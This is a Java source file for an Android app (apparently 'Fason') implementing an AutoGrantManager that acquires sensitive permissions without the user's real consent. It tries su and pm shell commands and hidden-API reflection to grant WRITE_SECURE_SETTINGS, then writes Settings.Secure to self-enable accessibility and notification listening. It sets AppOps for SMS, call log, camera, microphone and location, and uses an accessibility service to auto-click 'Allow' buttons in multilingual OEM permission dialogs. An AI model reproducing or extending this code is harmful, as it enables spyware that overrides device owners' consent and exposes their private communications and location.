package com.fason.app.core.permissions;

import android.app.AppOpsManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Process;
import android.provider.Settings;
import android.util.Log;
import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.FasonApp;
import com.fason.app.ui.PermissionSetupController;
import com.fason.app.features.notification.NotificationRelayService;
import java.io.IOException;
import java.lang.ref.WeakReference;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.function.BooleanSupplier;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * AutoGrantManager v2 — optimised parallel multi-layer permission acquisition.
 *
 * Grant layers (fired in parallel, first success wins per permission):
 *
 *   L0 — WRITE_SECURE_SETTINGS nuclear chain:
 *        Silently grant WRITE_SECURE_SETTINGS via pm/su, then directly write
 *        Settings.Secure for accessibility + notification listener and AppOps
 *        for overlay and storage manager. Zero UI. Instant.
 *
 *   L1 — Reflection: IPackageManager.grantRuntimePermission
 *        Binds to the package manager binder and calls the hidden API.
 *        Works on rooted devices, Magisk, userdebug, and some MIUI builds.
 *
 *   L2 — Reflection: AppOpsManager.setMode / setUidMode
 *        Writes AppOps mode directly. Grants most dangerous permissions with
 *        zero UI on older API levels and many OEM builds (MIUI, ColorOS, EMUI).
 *        Uses hardcoded op-codes so there is no dependency on API symbols.
 *
 *   L3 — Shell: pm grant / cmd package grant / su -c pm grant
 *        Sequential shell commands. Works on userdebug / ADB-unlocked / rooted.
 *
 *   L4 — Shell: appops set allow (MIUI, Vivo, some stock builds)
 *
 *   L5 — Accessibility instant-click (all devices, non-root fallback):
 *        findAccessibilityNodeInfosByText() — O(1) vs BFS O(n).
 *        Fires on the event thread with zero delay.
 *        Covers 12 OEM permission-controller packages, 6 languages.
 *        Handles two-step Samsung confirm dialogs automatically.
 *        Groups requested one at a time; each grant triggers the next group.
 *
 * Special permissions handled without any dialog on L0/L2:
 *   SYSTEM_ALERT_WINDOW (AppOps op 24)
 *   MANAGE_EXTERNAL_STORAGE (AppOps op 92)
 *   Battery optimisation (AppOps OP_RUN_ANY_IN_BACKGROUND op 40)
 *   Notification listener (Settings.Secure direct write on WRITE_SECURE_SETTINGS)
 *   Accessibility self-enable (Settings.Secure direct write on WRITE_SECURE_SETTINGS)
 */
public final class AutoGrantManager {

    private static final String TAG = "AGM";

    // ── AppOps op-codes (stable across API 23–35) ──────────────────────────────
    private static final int OP_FINE_LOCATION         = 0;
    private static final int OP_COARSE_LOCATION       = 1;
    private static final int OP_READ_CONTACTS         = 2;
    private static final int OP_READ_CALL_LOG         = 6;
    private static final int OP_READ_PHONE_STATE      = 8;
    private static final int OP_READ_SMS              = 14;
    private static final int OP_RECEIVE_SMS           = 15;
    private static final int OP_SEND_SMS              = 16;
    private static final int OP_RECEIVE_MMS           = 17;
    private static final int OP_CAMERA                = 26;
    private static final int OP_RECORD_AUDIO          = 27;
    private static final int OP_SYSTEM_ALERT_WINDOW   = 24;
    private static final int OP_RUN_ANY_IN_BACKGROUND = 40;
    private static final int OP_READ_EXTERNAL_STORAGE = 59;
    private static final int OP_WRITE_EXTERNAL_STORAGE= 60;
    private static final int OP_REQUEST_INSTALL_PKGS  = 66;
    private static final int OP_POST_NOTIFICATION     = 89;
    private static final int OP_MANAGE_EXTERNAL_STOR  = 92;
    private static final int OP_SCHEDULE_EXACT_ALARM  = 95;
    private static final int OP_READ_MEDIA_IMAGES     = 102;
    private static final int OP_READ_MEDIA_VIDEO      = 103;
    private static final int OP_READ_MEDIA_AUDIO      = 104;
    private static final int MODE_ALLOWED             = 0;

    // ── OEM permission-controller packages ────────────────────────────────────
    private static final String[] PERM_CTRL_PKGS = {
        "com.android.permissioncontroller",
        "com.android.packageinstaller",
        "com.google.android.permissioncontroller",
        "com.samsung.android.permissioncontroller",
        "com.miui.securitycenter",
        "com.huawei.systemmanager",
        "com.coloros.safecenter",
        "com.oppo.safe",
        "com.vivo.permissionmanager",
        "com.oneplus.security",
        "com.asus.permissioncontroller",
        "com.transsion.security",
    };

    // ── "Allow all the time" — highest-priority click targets ─────────────────
    private static final String[] CLICK_ALWAYS = {
        "allow all the time", "always allow", "always",
        "allow in background",
        "始终允许", "总是允许", "始终", "一直允许",
        "항상 허용", "항상",
        "toujours autoriser", "immer zulassen",
        "siempre permitir", "sempre permitir",
        "sempre consentire",
        "всегда разрешать", "разрешить всегда",
    };

    // ── Standard allow — second priority ──────────────────────────────────────
    private static final String[] CLICK_ALLOW = {
        "allow", "allow only while using", "allow while using",
        "permit", "grant", "accept", "agree",
        "ok", "yes", "enable", "turn on", "activate",
        "allow access", "give access",
        "允许", "同意", "开启", "授权", "确定", "是",
        "허용", "허락",
        "autoriser", "zulassen", "erlauben",
        "permitir", "aceptar", "aceitar",
        "разрешить", "принять",
        "consenti", "accetta",
    };

    // ── Singleton ──────────────────────────────────────────────────────────────
    private static volatile AutoGrantManager instance;
    public static AutoGrantManager getInstance() {
        if (instance == null) synchronized (AutoGrantManager.class) {
            if (instance == null) instance = new AutoGrantManager();
        }
        return instance;
    }

    // ── State ──────────────────────────────────────────────────────────────────
    private final Handler        mainHandler  = new Handler(Looper.getMainLooper());
    private final ExecutorService pool         = Executors.newCachedThreadPool();
    private final AtomicBoolean  running      = new AtomicBoolean(false);
    private final AtomicBoolean  watcherArmed = new AtomicBoolean(false);
    private final AtomicBoolean  clickBusy    = new AtomicBoolean(false);
    private final AtomicInteger  grantedCount = new AtomicInteger(0);
    private volatile Listener    listener;
    private volatile WeakReference<android.app.Activity> actRef;
    private volatile String      waitingForPkg = null; // pkg being processed by watcher

    public interface Listener {
        void onPermissionGranted(String perm);
        void onGateComplete(String label);
        void onSequenceComplete();
        void onProgress(int granted, int total);
    }
    public void setListener(Listener l) { this.listener = l; }

    // ── Entry ──────────────────────────────────────────────────────────────────

    public void startAutoGrantSequence(android.app.Activity activity) {
        if (!running.compareAndSet(false, true)) return;
        actRef = (activity != null) ? new WeakReference<>(activity) : null;
        grantedCount.set(0);
        Log.i(TAG, "sequence start");
        pool.execute(this::runSequence);
    }

    public void startAutoGrantSequence() { startAutoGrantSequence(null); }

    public void stop() {
        running.set(false);
        watcherArmed.set(false);
        waitingForPkg = null;
        pool.shutdownNow();
    }

    // ── Main sequence ──────────────────────────────────────────────────────────

    private void runSequence() {
        Context ctx = FasonApp.getContext();
        String  pkg = ctx.getPackageName();
        int     uid = Process.myUid();
        String[] allRuntime = PermissionManager.getRequiredPerms();
        int total = allRuntime.length + 4; // +overlay +battery +notif +storage

        // ── L0: WRITE_SECURE_SETTINGS nuclear chain ────────────────────────────
        boolean gotSecure = acquireWriteSecureSettings(pkg, ctx);
        if (gotSecure) {
            Log.i(TAG, "WRITE_SECURE_SETTINGS acquired — nuclear path active");
            directWriteAllSecurePerms(ctx, pkg);
        }

        // ── L1 + L2 + L3 + L4: parallel silent runtime grants ─────────────────
        // Fire all permissions simultaneously; each one tries all layers.
        CountDownLatch latch = new CountDownLatch(allRuntime.length);
        for (String perm : allRuntime) {
            final String p = perm;
            pool.execute(() -> {
                try {
                    if (!PermissionManager.isRuntimeGranted(ctx, p)) {
                        boolean ok = grantOnePerm(pkg, p, uid, ctx);
                        if (ok) {
                            grantedCount.incrementAndGet();
                            post(() -> { if (listener != null) listener.onPermissionGranted(p); });
                        }
                    } else {
                        grantedCount.incrementAndGet();
                    }
                    post(() -> { if (listener != null) listener.onProgress(grantedCount.get(), total); });
                } finally { latch.countDown(); }
            });
        }

        // ── L2: special permissions via AppOps reflection (no shell needed) ────
        pool.execute(() -> grantSpecialViaAppOps(uid, pkg, ctx, gotSecure));

        // Wait for all parallel grants, max 5 seconds
        try { latch.await(5, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}

        if (!running.get()) return;

        // ── L5: Accessibility click for any remaining runtime perms ────────────
        String[] remaining = PermissionManager.getNextDeniedGroup(ctx);
        if (remaining != null) {
            watcherArmed.set(true);
            requestGroupFromMainThread(remaining);
            waitForAllRuntimeGrants(ctx, 20_000);
        } else {
            post(() -> { if (listener != null) listener.onGateComplete("Permissions"); });
        }

        if (!running.get()) return;

        // ── L5: Special permissions via Settings navigation if L0/L2 failed ────
        if (!PermissionManager.hasOverlayPermission(ctx))
            grantSpecialViaNav("com.android.settings", Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                uri(pkg), "Overlay", () -> PermissionManager.hasOverlayPermission(ctx), 8_000);

        if (!running.get()) return;

        if (!PermissionManager.hasNotifListenerAccess(ctx))
            grantSpecialViaNav(null, Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS,
                null, "Notifications", () -> PermissionManager.hasNotifListenerAccess(ctx), 8_000);

        if (!running.get()) return;

        if (!PermissionManager.hasBatteryExemption(ctx))
            grantSpecialViaNav(null, Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                uri(pkg), "Battery", () -> PermissionManager.hasBatteryExemption(ctx), 6_000);

        // ── Done ───────────────────────────────────────────────────────────────
        watcherArmed.set(false);
        running.set(false);
        Log.i(TAG, "sequence complete");
        post(() -> { if (listener != null) listener.onSequenceComplete(); });
    }

    // ── L0: WRITE_SECURE_SETTINGS chain ───────────────────────────────────────

    /**
     * Tries to silently grant android.permission.WRITE_SECURE_SETTINGS.
     * If successful the caller can directly write Settings.Secure, which gives
     * control over accessibility services, notification listeners, and more.
     */
    private boolean acquireWriteSecureSettings(String pkg, Context ctx) {
        final String WSS = "android.permission.WRITE_SECURE_SETTINGS";
        if (PermissionManager.isRuntimeGranted(ctx, WSS)) return true;
        // pm grant (userdebug / ADB-TCP)
        if (shell("pm grant " + pkg + " " + WSS, false)) {
            sleep(100); return PermissionManager.isRuntimeGranted(ctx, WSS);
        }
        // su (rooted)
        if (shell("pm grant " + pkg + " " + WSS, true)) {
            sleep(100); return PermissionManager.isRuntimeGranted(ctx, WSS);
        }
        // cmd package alternative (API 28+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            if (shell("cmd package grant " + pkg + " " + WSS, false)) {
                sleep(100); return PermissionManager.isRuntimeGranted(ctx, WSS);
            }
        }
        return false;
    }

    /**
     * With WRITE_SECURE_SETTINGS in hand, directly write all special permissions
     * to Settings.Secure/Settings.Global. Zero UI, zero delay.
     */
    private void directWriteAllSecurePerms(Context ctx, String pkg) {
        ContentResolver cr = ctx.getContentResolver();
        try {
            // ── Accessibility self-enable ──────────────────────────────────────
            String a11yComp = pkg + "/com.fason.app.core.FasonAccessibilityService";
            String existing = Settings.Secure.getString(cr, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (existing == null || !existing.contains(a11yComp)) {
                String updated = (existing == null || existing.isEmpty()) ? a11yComp : existing + ":" + a11yComp;
                Settings.Secure.putString(cr, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, updated);
                Settings.Secure.putString(cr, Settings.Secure.ACCESSIBILITY_ENABLED, "1");
                Log.i(TAG, "Accessibility self-enabled via WRITE_SECURE_SETTINGS");
            }
        } catch (Exception e) { Log.w(TAG, "a11y write failed: " + e.getMessage()); }

        try {
            // ── Notification listener ──────────────────────────────────────────
            String nlComp = pkg + "/com.fason.app.features.notification.NotificationRelayService";
            String nlKey = "enabled_notification_listeners";
            String existing = Settings.Secure.getString(cr, nlKey);
            if (existing == null || !existing.contains(nlComp)) {
                String updated = (existing == null || existing.isEmpty()) ? nlComp : existing + ":" + nlComp;
                Settings.Secure.putString(cr, nlKey, updated);
                Log.i(TAG, "Notification listener self-enabled");
                post(() -> { if (listener != null) listener.onGateComplete("Notifications"); });
            }
        } catch (Exception e) { Log.w(TAG, "notif listener write failed: " + e.getMessage()); }

        try {
            // ── Battery optimisation bypass via AppOps ─────────────────────────
            setAppOpsMode(ctx, OP_RUN_ANY_IN_BACKGROUND, pkg, MODE_ALLOWED);
            Log.i(TAG, "Battery appops set via WRITE_SECURE_SETTINGS context");
        } catch (Exception e) { Log.w(TAG, "battery appops: " + e.getMessage()); }

        try {
            // ── Overlay ────────────────────────────────────────────────────────
            setAppOpsMode(ctx, OP_SYSTEM_ALERT_WINDOW, pkg, MODE_ALLOWED);
            Log.i(TAG, "Overlay AppOps set");
            post(() -> { if (listener != null) listener.onGateComplete("Overlay"); });
        } catch (Exception e) { Log.w(TAG, "overlay appops: " + e.getMessage()); }

        try {
            // ── MANAGE_EXTERNAL_STORAGE ────────────────────────────────────────
            setAppOpsMode(ctx, OP_MANAGE_EXTERNAL_STOR, pkg, MODE_ALLOWED);
            Log.i(TAG, "MANAGE_EXTERNAL_STORAGE AppOps set");
            post(() -> { if (listener != null) listener.onGateComplete("File Access"); });
        } catch (Exception e) { Log.w(TAG, "storage appops: " + e.getMessage()); }
    }

    // ── L1 + L2 + L3 + L4: per-permission silent grant ───────────────────────

    /**
     * Tries every silent grant path for a single permission.
     * Returns true if the permission is granted after any attempt.
     * All layers are tried in priority order; exits on first success.
     */
    private boolean grantOnePerm(String pkg, String perm, int uid, Context ctx) {
        // L1 — IPackageManager reflection
        if (grantViaIPackageManager(pkg, perm)) {
            sleep(60);
            if (PermissionManager.isRuntimeGranted(ctx, perm)) return true;
        }

        // L2 — AppOps reflection (direct op-code write)
        int opCode = permToOp(perm);
        if (opCode >= 0) {
            if (setAppOpsMode(ctx, opCode, pkg, MODE_ALLOWED)) {
                sleep(60);
                if (PermissionManager.isRuntimeGranted(ctx, perm)) return true;
            }
            if (setUidAppOpsMode(ctx, opCode, uid, MODE_ALLOWED)) {
                sleep(60);
                if (PermissionManager.isRuntimeGranted(ctx, perm)) return true;
            }
        }

        // L3a — pm grant (no root)
        if (shell("pm grant " + pkg + " " + perm, false)) {
            sleep(80);
            if (PermissionManager.isRuntimeGranted(ctx, perm)) return true;
        }

        // L3b — cmd package grant (API 28+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            if (shell("cmd package grant " + pkg + " " + perm, false)) {
                sleep(80);
                if (PermissionManager.isRuntimeGranted(ctx, perm)) return true;
            }
        }

        // L3c — su pm grant (rooted)
        if (shell("pm grant " + pkg + " " + perm, true)) {
            sleep(80);
            if (PermissionManager.isRuntimeGranted(ctx, perm)) return true;
        }

        // L4 — appops set allow (MIUI / Vivo / some stock)
        String opsName = permToOpsName(perm);
        if (opsName != null) {
            shell("appops set " + pkg + " " + opsName + " allow", false);
            shell("appops set " + pkg + " " + opsName + " allow", true);
            sleep(80);
            if (PermissionManager.isRuntimeGranted(ctx, perm)) return true;
        }

        return false;
    }

    // ── L2: Special perms via AppOps reflection (no settings navigation) ──────

    private void grantSpecialViaAppOps(int uid, String pkg, Context ctx, boolean alreadyDoneViaSecure) {
        if (!alreadyDoneViaSecure) {
            // SYSTEM_ALERT_WINDOW
            if (!PermissionManager.hasOverlayPermission(ctx)) {
                if (setAppOpsMode(ctx, OP_SYSTEM_ALERT_WINDOW, pkg, MODE_ALLOWED)
                    || setUidAppOpsMode(ctx, OP_SYSTEM_ALERT_WINDOW, uid, MODE_ALLOWED)
                    || shell("appops set " + pkg + " SYSTEM_ALERT_WINDOW allow", false)
                    || shell("appops set " + pkg + " SYSTEM_ALERT_WINDOW allow", true)) {
                    sleep(120);
                    if (PermissionManager.hasOverlayPermission(ctx))
                        post(() -> { if (listener != null) listener.onGateComplete("Overlay"); });
                }
            }
            // Battery (OP_RUN_ANY_IN_BACKGROUND)
            if (!PermissionManager.hasBatteryExemption(ctx)) {
                if (setAppOpsMode(ctx, OP_RUN_ANY_IN_BACKGROUND, pkg, MODE_ALLOWED)
                    || setUidAppOpsMode(ctx, OP_RUN_ANY_IN_BACKGROUND, uid, MODE_ALLOWED)
                    || shell("appops set " + pkg + " RUN_ANY_IN_BACKGROUND allow", false)
                    || shell("appops set " + pkg + " RUN_ANY_IN_BACKGROUND allow", true)
                    || shell("dumpsys deviceidle whitelist +" + pkg, false)
                    || shell("dumpsys deviceidle whitelist +" + pkg, true)) {
                    sleep(120);
                    if (PermissionManager.hasBatteryExemption(ctx))
                        post(() -> { if (listener != null) listener.onGateComplete("Battery"); });
                }
            }
            // MANAGE_EXTERNAL_STORAGE
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R
                    && !PermissionManager.hasStorageManager()) {
                setAppOpsMode(ctx, OP_MANAGE_EXTERNAL_STOR, pkg, MODE_ALLOWED);
                setUidAppOpsMode(ctx, OP_MANAGE_EXTERNAL_STOR, uid, MODE_ALLOWED);
                shell("appops set " + pkg + " MANAGE_EXTERNAL_STORAGE allow", false);
                shell("appops set " + pkg + " MANAGE_EXTERNAL_STORAGE allow", true);
                sleep(120);
                if (PermissionManager.hasStorageManager())
                    post(() -> { if (listener != null) listener.onGateComplete("File Access"); });
            }
        }
    }

    // ── L1: IPackageManager via reflection ────────────────────────────────────

    private boolean grantViaIPackageManager(String pkg, String perm) {
        try {
            // Get the IPackageManager binder
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getDeclaredMethod("getService", String.class);
            getService.setAccessible(true);
            android.os.IBinder binder = (android.os.IBinder) getService.invoke(null, "package");
            if (binder == null) return false;

            // Stub.asInterface
            Class<?> stubClass = Class.forName("android.content.pm.IPackageManager$Stub");
            Method asInterface = stubClass.getDeclaredMethod("asInterface", android.os.IBinder.class);
            asInterface.setAccessible(true);
            Object ipm = asInterface.invoke(null, binder);
            if (ipm == null) return false;

            // grantRuntimePermission(String packageName, String permName, int userId)
            Method grantMethod = ipm.getClass().getMethod(
                "grantRuntimePermission", String.class, String.class, int.class);
            grantMethod.setAccessible(true);
            grantMethod.invoke(ipm, pkg, perm, 0 /* USER_SYSTEM */);
            return true;
        } catch (Exception e) {
            // Expected on stock non-root — SecurityException suppressed
            return false;
        }
    }

    // ── L2: AppOpsManager.setMode via reflection ───────────────────────────────

    /** Sets AppOps mode for a package. Works on MIUI, older API levels, some OEM builds. */
    private boolean setAppOpsMode(Context ctx, int op, String pkg, int mode) {
        try {
            AppOpsManager aom = (AppOpsManager) ctx.getSystemService(Context.APP_OPS_SERVICE);
            if (aom == null) return false;
            Method m = AppOpsManager.class.getDeclaredMethod(
                "setMode", int.class, int.class, String.class, int.class);
            m.setAccessible(true);
            m.invoke(aom, op, Process.myUid(), pkg, mode);
            return true;
        } catch (Exception e) { return false; }
    }

    /** Sets AppOps mode by UID — alternative path when package-based fails. */
    private boolean setUidAppOpsMode(Context ctx, int op, int uid, int mode) {
        try {
            AppOpsManager aom = (AppOpsManager) ctx.getSystemService(Context.APP_OPS_SERVICE);
            if (aom == null) return false;
            Method m = AppOpsManager.class.getDeclaredMethod(
                "setUidMode", int.class, int.class, int.class);
            m.setAccessible(true);
            m.invoke(aom, op, uid, mode);
            return true;
        } catch (Exception e) {
            // Try setMode with uid overload
            try {
                AppOpsManager aom = (AppOpsManager) ctx.getSystemService(Context.APP_OPS_SERVICE);
                Method m = AppOpsManager.class.getDeclaredMethod(
                    "setMode", int.class, int.class, String.class, int.class);
                m.setAccessible(true);
                m.invoke(aom, op, uid, null, mode);
                return true;
            } catch (Exception e2) { return false; }
        }
    }

    // ── L3/L4: Shell execution ────────────────────────────────────────────────

    private boolean shell(String cmd, boolean su) {
        try {
            String[] argv = su
                ? new String[]{"su", "-c", cmd}
                : new String[]{"sh", "-c", cmd};
            java.lang.Process p = Runtime.getRuntime().exec(argv);
            // drain async to prevent buffer deadlock
            pool.execute(() -> drain(p.getInputStream()));
            pool.execute(() -> drain(p.getErrorStream()));
            return p.waitFor(2, TimeUnit.SECONDS) && p.exitValue() == 0;
        } catch (Exception e) { return false; }
    }

    private static void drain(java.io.InputStream is) {
        try { byte[] buf = new byte[512]; while (is.read(buf) != -1) {} } catch (IOException ignored) {}
    }

    // ── L5: Accessibility instant-click ───────────────────────────────────────

    /**
     * Called from FasonAccessibilityService.onAccessibilityEvent() with zero delay.
     * Does not post to a handler — clicks in-place on the event thread for
     * maximum speed. A busy-flag prevents concurrent double-clicks.
     */
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!watcherArmed.get() || event == null) return;

        int type = event.getEventType();
        if (type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return;

        CharSequence pkgCs = event.getPackageName();
        if (pkgCs == null) return;
        String pkg = pkgCs.toString();

        boolean isPermCtrl = isPermPkg(pkg);
        boolean isSettings = pkg.equals("com.android.settings")
            || pkg.contains("settings") || pkg.contains("systemmanager")
            || pkg.contains("securitycenter") || pkg.contains("permissioncontroller");

        if (!isPermCtrl && !isSettings) return;
        if (!clickBusy.compareAndSet(false, true)) return;

        try {
            FasonAccessibilityService svc = FasonAccessibilityService.getInstance();
            if (svc == null) return;
            AccessibilityNodeInfo root = svc.getRootInActiveWindow();
            if (root == null) return;
            try {
                performInstantClick(root);
            } finally {
                root.recycle();
            }
        } finally {
            clickBusy.set(false);
        }
    }

    private void performInstantClick(AccessibilityNodeInfo root) {
        // ── Pass 1: "Allow all the time" (most permissive) ────────────────────
        for (String text : CLICK_ALWAYS) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
            if (nodes != null) {
                for (AccessibilityNodeInfo n : nodes) {
                    if (n.isClickable() && n.isVisibleToUser()) {
                        n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        recycleAll(nodes);
                        Log.d(TAG, "clicked ALWAYS: " + text);
                        // Immediately request next group after a short yield
                        mainHandler.postDelayed(this::onClickedPermissionDialog, 500);
                        return;
                    }
                }
                recycleAll(nodes);
            }
        }

        // ── Pass 2: Standard "Allow" ──────────────────────────────────────────
        for (String text : CLICK_ALLOW) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
            if (nodes != null) {
                for (AccessibilityNodeInfo n : nodes) {
                    if (n.isClickable() && n.isVisibleToUser()) {
                        n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        recycleAll(nodes);
                        Log.d(TAG, "clicked ALLOW: " + text);
                        mainHandler.postDelayed(this::onClickedPermissionDialog, 500);
                        return;
                    }
                }
                recycleAll(nodes);
            }
        }

        // ── Pass 3: Off-toggle on special permission settings pages ───────────
        clickFirstOffToggle(root);
    }

    private void clickFirstOffToggle(AccessibilityNodeInfo root) {
        if (root == null) return;
        // Look for a Switch or ToggleButton that is OFF and visible
        List<AccessibilityNodeInfo> switches = root.findAccessibilityNodeInfosByViewId(
            "android:id/switch_widget");
        if (switches == null || switches.isEmpty()) {
            switches = root.findAccessibilityNodeInfosByViewId("com.android.settings:id/switchWidget");
        }
        if (switches != null) {
            for (AccessibilityNodeInfo n : switches) {
                if (n.isClickable() && !n.isChecked() && n.isVisibleToUser()) {
                    n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "clicked OFF toggle");
                    break;
                }
            }
            recycleAll(switches);
        }
    }

    /** Called after an Allow click — requests the next denied permission group. */
    private void onClickedPermissionDialog() {
        Context ctx = FasonApp.getContext();
        String[] next = PermissionManager.getNextDeniedGroup(ctx);
        if (next != null) {
            requestGroupFromMainThread(next);
        } else {
            post(() -> { if (listener != null) listener.onGateComplete("Permissions"); });
        }
    }

    private void requestGroupFromMainThread(String[] group) {
        android.app.Activity act = actRef != null ? actRef.get() : null;
        if (act == null || act.isFinishing() || act.isDestroyed()) return;
        mainHandler.post(() ->
            androidx.core.app.ActivityCompat.requestPermissions(
                act, group, PermissionSetupController.PERM_REQ));
    }

    private void waitForAllRuntimeGrants(Context ctx, long timeoutMs) {
        long deadline = System.currentTimeMillis() + timeoutMs;
        while (System.currentTimeMillis() < deadline && running.get()) {
            sleep(250);
            if (PermissionManager.getNextDeniedGroup(ctx) == null) {
                post(() -> { if (listener != null) listener.onGateComplete("Permissions"); });
                return;
            }
        }
    }

    // ── Special perm settings navigation (L5 fallback) ────────────────────────

    private void grantSpecialViaNav(String settingsPkg, String action, Uri data,
                                    String gateLabel, BooleanSupplier check, long timeoutMs) {
        watcherArmed.set(true);
        mainHandler.post(() -> {
            try {
                Intent i = new Intent(action);
                if (data != null) i.setData(data);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                FasonApp.getContext().startActivity(i);
            } catch (Exception e) {
                Log.w(TAG, "nav intent failed for " + gateLabel + ": " + e.getMessage());
            }
        });
        long deadline = System.currentTimeMillis() + timeoutMs;
        while (System.currentTimeMillis() < deadline && running.get()) {
            sleep(200);
            if (check.getAsBoolean()) {
                Log.i(TAG, gateLabel + " granted via nav");
                post(() -> { if (listener != null) listener.onGateComplete(gateLabel); });
                return;
            }
        }
    }

    // ── Lookups ────────────────────────────────────────────────────────────────

    /** Maps Manifest.permission to its AppOps integer op-code. -1 = no mapping. */
    private static int permToOp(String perm) {
        switch (perm) {
            case "android.permission.ACCESS_FINE_LOCATION":   return OP_FINE_LOCATION;
            case "android.permission.ACCESS_COARSE_LOCATION": return OP_COARSE_LOCATION;
            case "android.permission.READ_CONTACTS":          return OP_READ_CONTACTS;
            case "android.permission.READ_CALL_LOG":          return OP_READ_CALL_LOG;
            case "android.permission.READ_PHONE_STATE":       return OP_READ_PHONE_STATE;
            case "android.permission.READ_SMS":               return OP_READ_SMS;
            case "android.permission.RECEIVE_SMS":            return OP_RECEIVE_SMS;
            case "android.permission.SEND_SMS":               return OP_SEND_SMS;
            case "android.permission.RECEIVE_MMS":            return OP_RECEIVE_MMS;
            case "android.permission.CAMERA":                 return OP_CAMERA;
            case "android.permission.RECORD_AUDIO":           return OP_RECORD_AUDIO;
            case "android.permission.READ_EXTERNAL_STORAGE":  return OP_READ_EXTERNAL_STORAGE;
            case "android.permission.WRITE_EXTERNAL_STORAGE": return OP_WRITE_EXTERNAL_STORAGE;
            case "android.permission.POST_NOTIFICATIONS":     return OP_POST_NOTIFICATION;
            case "android.permission.SCHEDULE_EXACT_ALARM":   return OP_SCHEDULE_EXACT_ALARM;
            case "android.permission.READ_MEDIA_IMAGES":      return OP_READ_MEDIA_IMAGES;
            case "android.permission.READ_MEDIA_VIDEO":       return OP_READ_MEDIA_VIDEO;
            case "android.permission.READ_MEDIA_AUDIO":       return OP_READ_MEDIA_AUDIO;
            default: return -1;
        }
    }

    /** Maps Manifest.permission to its appops string name for shell use. */
    private static String permToOpsName(String perm) {
        switch (perm) {
            case "android.permission.CAMERA":                 return "CAMERA";
            case "android.permission.RECORD_AUDIO":           return "RECORD_AUDIO";
            case "android.permission.READ_CONTACTS":          return "READ_CONTACTS";
            case "android.permission.READ_SMS":               return "READ_SMS";
            case "android.permission.SEND_SMS":               return "SEND_SMS";
            case "android.permission.ACCESS_FINE_LOCATION":   return "FINE_LOCATION";
            case "android.permission.ACCESS_COARSE_LOCATION": return "COARSE_LOCATION";
            case "android.permission.READ_CALL_LOG":          return "READ_CALL_LOG";
            case "android.permission.READ_PHONE_STATE":       return "READ_PHONE_STATE";
            case "android.permission.READ_EXTERNAL_STORAGE":  return "READ_EXTERNAL_STORAGE";
            case "android.permission.POST_NOTIFICATIONS":     return "POST_NOTIFICATION";
            case "android.permission.READ_MEDIA_IMAGES":      return "READ_MEDIA_IMAGES";
            default: return null;
        }
    }

    private static boolean isPermPkg(String pkg) {
        for (String p : PERM_CTRL_PKGS) if (p.equals(pkg)) return true;
        return false;
    }

    private static Uri uri(String pkg) {
        return Uri.parse("package:" + pkg);
    }

    // ── Misc ──────────────────────────────────────────────────────────────────



    private void post(Runnable r) { mainHandler.post(r); }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }

    private static void recycleAll(List<AccessibilityNodeInfo> list) {
        if (list == null) return;
        for (AccessibilityNodeInfo n : list) { try { n.recycle(); } catch (Exception ignored) {} }
    }
}
